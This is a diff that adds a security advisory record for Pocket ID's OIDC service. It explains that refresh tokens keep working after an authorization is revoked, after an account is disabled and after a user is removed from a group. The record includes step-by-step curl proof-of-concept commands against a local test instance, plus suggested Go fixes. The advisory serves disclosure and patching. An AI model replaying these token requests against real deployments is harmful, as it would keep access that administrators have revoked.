@@ -1,0 +1,61 @@
+{
+  "id": "GHSA-w6p7-2fxx-4f44",
+  "modified": "2026-07-28T14:30:38.050086588Z",
+  "published": "2026-07-28T14:12:44Z",
+  "aliases": [
+    "CVE-2026-43983"
+  ],
+  "related": [
+    "CVE-2026-43891",
+    "PYSEC-2026-30"
+  ],
+  "summary": "Pocket ID: OIDC refresh token flow bypasses authorization revocation, account disabling, and group restrictions",
+  "details": "# OIDC Refresh Token Flow Bypasses Authorization Revocation, Account Disabling, and Group Restrictions\n\n## Summary\n\nThe `createTokenFromRefreshToken` function (oidc_service.go:451) validates the refresh token's cryptographic integrity but does not re-validate the user's current authorization state before issuing new tokens. This allows three bypasses:\n\n1. **Authorization revocation bypass**: After a user revokes an OIDC client's authorization, the client can continue refreshing tokens indefinitely because `RevokeAuthorizedClient` does not delete associated refresh tokens, and the refresh flow does not check if the authorization record still exists.\n\n2. **Disabled user bypass**: After an admin disables a user account, pre-existing refresh tokens continue to work because the OIDC token endpoint does not check `user.Disabled`. Session-based access is properly blocked by auth middleware, but the OIDC refresh path bypasses it entirely.\n\n3. **Group restriction bypass**: After removing a user from an OIDC client's allowed user groups, the refresh token continues to work because `createTokenFromRefreshToken` does not call `IsUserGroupAllowedToAuthorize`.\n\nEach refresh rotates the token with a fresh 30-day expiry, enabling perpetual access.\n\n## Target\n\n- **Repository**: pocket-id/pocket-id\n- **Version**: HEAD (626adbf), also affects v2.5.0 and all versions with refresh token support\n\n## Root Cause\n\n`createTokenFromRefreshToken` (oidc_service.go:451-547) performs the following checks on a refresh request:\n\n1. Verify the signed refresh token JWT (line 457) -- **checked**\n2. Verify client credentials (line 467) -- **checked**\n3. Look up stored refresh token by hash, expiry, user_id, client_id (line 478-495) -- **checked**\n4. Verify refresh token belongs to the requesting client (line 498) -- **checked**\n\nIt does NOT check:\n- Whether a `UserAuthorizedOidcClient` record still exists for the user-client pair -- **MISSING**\n- Whether `user.Disabled` is false -- **MISSING**\n- Whether `IsUserGroupAllowedToAuthorize` passes for group-restricted clients -- **MISSING** (groups are loaded at line 481 via `Preload(\"User.UserGroups\")` but never validated)\n\nMeanwhile, `RevokeAuthorizedClient` (line 1445-1471) only deletes the `UserAuthorizedOidcClient` record. It does not delete associated `OidcRefreshToken` records. There is no FK cascade between these tables (the FK cascade on `oidc_refresh_tokens` is only on user DELETE and client DELETE, not on authorization record deletion).\n\n## Proof of Concept (Verified Live)\n\nTested against Pocket ID HEAD (626adbf) running in Docker with e2etest build. All 20 test assertions pass.\n\n### Variant 1: Authorization Revocation Bypass\n\n```bash\n# Reset test DB\ncurl -s -X POST http://localhost:1411/api/test/reset?skip-ldap=true\n\n# Authenticate as Tim (admin user, seeded OTA token)\ncurl -s -c cookies.txt -X POST http://localhost:1411/api/one-time-access-token/HPe6k6uiDRRVuAQV\n\n# Authorize Nextcloud client\nAUTH_CODE=$(curl -s -b cookies.txt -X POST http://localhost:1411/api/oidc/authorize \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"clientId\":\"3654a746-35d4-4321-ac61-0bdcff2b4055\",\"scope\":\"openid profile email groups\",\"callbackURL\":\"http://nextcloud/auth/callback\"}' \\\n  | python3 -c \"import json,sys; print(json.load(sys.stdin)['code'])\")\n\n# Exchange for tokens (including refresh token)\nTOKENS=$(curl -s -X POST http://localhost:1411/api/oidc/token \\\n  -d \"grant_type=authorization_code\u0026code=$AUTH_CODE\u0026client_id=3654a746-35d4-4321-ac61-0bdcff2b4055\u0026client_secret=w2mUeZISmEvIDMEDvpY0PnxQIpj1m3zY\u0026redirect_uri=http://nextcloud/auth/callback\")\nREFRESH=$(echo $TOKENS | python3 -c \"import json,sys; print(json.load(sys.stdin)['refresh_token'])\")\n\n# User revokes authorization (returns 204)\ncurl -s -o /dev/null -w \"%{http_code}\" -b cookies.txt \\\n  -X DELETE http://localhost:1411/api/oidc/users/me/authorized-clients/3654a746-35d4-4321-ac61-0bdcff2b4055\n# Output: 204\n\n# ATTACK: Refresh token STILL WORKS after revocation\ncurl -s -X POST http://localhost:1411/api/oidc/token \\\n  -d \"grant_type=refresh_token\u0026refresh_token=$REFRESH\u0026client_id=3654a746-35d4-4321-ac61-0bdcff2b4055\u0026client_secret=w2mUeZISmEvIDMEDvpY0PnxQIpj1m3zY\"\n# Returns 200 with new access_token, id_token (containing PII), and refresh_token (new 30-day expiry)\n```\n\n**Live output**: Introspection confirms `active: true`. ID token contains: `name: Tim Cook, email: tim.cook@test.com, groups: [designers, developers]`.\n\n### Variant 2: Disabled User Bypass\n\n```bash\n# (After setup and obtaining refresh token as above)\n\n# Admin disables Tim's account\ncurl -s -b cookies.txt -X PUT http://localhost:1411/api/users/f4b89dc2-62fb-46bf-9f5f-c34f4eafe93e \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"disabled\":true,\"username\":\"tim\",\"email\":\"tim.cook@test.com\",\"firstName\":\"Tim\",\"lastName\":\"Cook\",\"isAdmin\":true}'\n# Returns 200 with disabled: true\n\n# Session access properly blocked (auth middleware checks Disabled)\ncurl -s -o /dev/null -w \"%{http_code}\" -b cookies.txt http://localhost:1411/api/users/me\n# Output: 401\n\n# ATTACK: Refresh token STILL WORKS for disabled user\ncurl -s -X POST http://localhost:1411/api/oidc/token \\\n  -d \"grant_type=refresh_token\u0026refresh_token=$REFRESH\u0026client_id=3654a746-35d4-4321-ac61-0bdcff2b4055\u0026client_secret=w2mUeZISmEvIDMEDvpY0PnxQIpj1m3zY\"\n# Returns 200 with full token set\n\n# Userinfo also works for disabled user\ncurl -s -H \"Authorization: Bearer $NEW_ACCESS\" http://localhost:1411/api/oidc/userinfo\n# Returns: {\"name\":\"Tim Cook\",\"email\":\"tim.cook@test.com\",...}\n```\n\n**Impact**: The admin kill switch for terminating employee access is completely bypassed. A fired employee's pre-existing OIDC refresh tokens continue to grant access to all downstream services.\n\n### Variant 3: Group Restriction Bypass\n\n```bash\n# (After setup, authorize Immich client which is group-restricted to \"designers\")\n# Tim is in designers group, gets authorized and obtains refresh token\n\n# Remove Tim from designers group (keep only Craig)\ncurl -s -b cookies.txt -X PUT http://localhost:1411/api/user-groups/adab18bf-f89d-4087-9ee1-70ff15b48211/users \\\n  -H \"Content-Type: application/json\" -d '{\"userIds\":[\"1cd19686-f9a6-43f4-a41f-14a0bf5b4036\"]}'\n# Tim no longer in designers\n\n# ATTACK: Refresh token STILL WORKS after group removal\n# Returns 200 with new tokens\n```\n\n## Impact\n\nThe three variants share the same root cause but have different real-world implications:\n\n1. **Authorization revocation is ineffective**: Users who revoke an OIDC client's access have a false sense of security. A malicious or compromised client retains indefinite access to the user's identity data through token rotation. The id_token issued during refresh contains full PII (name, email, groups, custom claims) regardless of the userinfo endpoint's authorization check.\n\n2. **Account disabling does not terminate OIDC access**: This is the highest-severity variant. When an organization terminates an employee and disables their Pocket ID account, all session-based access is correctly blocked. But any OIDC client that obtained a refresh token before the disabling continues to have full access. In enterprise environments where Pocket ID gates access to sensitive services (Git, CI/CD, infrastructure), this creates a persistent backdoor.\n\n3. **Group-based access control is only enforced at authorization time**: Group restrictions on OIDC clients (e.g., \"only the infrastructure team can access the CI/CD client\") can be bypassed by anyone who obtained a refresh token before being removed from the group.\n\n## Related\n\nGitHub issue #1390 reports a similar pattern: refresh tokens are not deleted when a session ends via the end-session endpoint. Same root cause (refresh token lifecycle detached from authorization state), different entry point.\n\n## Suggested Fix\n\n### Primary fix: Re-validate authorization state in createTokenFromRefreshToken\n\nAdd the following checks after the refresh token lookup (after line 495):\n\n```go\n// Check 1: Verify user is not disabled\nif storedRefreshToken.User.Disabled {\n    return CreatedTokens{}, \u0026common.OidcInvalidRefreshTokenError{}\n}\n\n// Check 2: Verify UserAuthorizedOidcClient still exists\nvar authorizedClient model.UserAuthorizedOidcClient\nerr = tx.WithContext(ctx).\n    Where(\"user_id = ? AND client_id = ?\", storedRefreshToken.UserID, input.ClientID).\n    First(\u0026authorizedClient).Error\nif errors.Is(err, gorm.ErrRecordNotFound) {\n    // Authorization was revoked - delete this refresh token and reject\n    tx.Delete(\u0026storedRefreshToken)\n    return CreatedTokens{}, \u0026common.OidcInvalidRefreshTokenError{}\n}\n\n// Check 3: Re-verify group restrictions\nif !IsUserGroupAllowedToAuthorize(storedRefreshToken.User, client) {\n    return CreatedTokens{}, \u0026common.OidcAccessDeniedError{}\n}\n```\n\n### Secondary fix: Delete refresh tokens on authorization revocation\n\nIn `RevokeAuthorizedClient`, also delete all refresh tokens for the user-client pair:\n\n```go\n// After deleting the authorized client record\nerr = tx.WithContext(ctx).\n    Where(\"user_id = ? AND client_id = ?\", userID, clientID).\n    Delete(\u0026model.OidcRefreshToken{}).Error\nif err != nil {\n    return err\n}\n```\n\nBoth fixes should be applied together (defense in depth).\n\n## Self-Review\n\n- **Is this by-design?** No. The revocation feature, the disabled flag, and group restrictions all exist to control access. The refresh flow bypassing all three is a bug, not a feature.\n- **Are there upstream bounds?** No. Refresh tokens are stored independently. No FK cascade, no periodic cleanup, no validation of authorization state.\n- **Honest weaknesses**: \n  - Variant 1 (revocation): The attacker must be the OIDC client operator (they need client credentials and existing refresh token). Userinfo endpoint does return 404 after revocation, which is a partial mitigation. But the id_token issued during refresh already contains all PII.\n  - All variants: Requires a pre-existing refresh token, so the access must have been legitimately granted at some point.\n- **Existing reports**: Issue #1390 covers the related end-session case. No prior security reports for the revocation/disabled/group variants.\n\n\nKoda Reef",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/pocket-id/pocket-id/backend",
+        "purl": "pkg:golang/github.com/pocket-id/pocket-id/backend"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.0-20260419162744-978ac87deffe"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-w6p7-2fxx-4f44/GHSA-w6p7-2fxx-4f44.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-w6p7-2fxx-4f44"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-43983"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pocket-id/pocket-id/commit/978ac87deffec58beaccd15aead975e91b94c8a5"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/pocket-id/pocket-id"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pocket-id/pocket-id/releases/tag/v2.6.0"
+    }
+  ]
+}
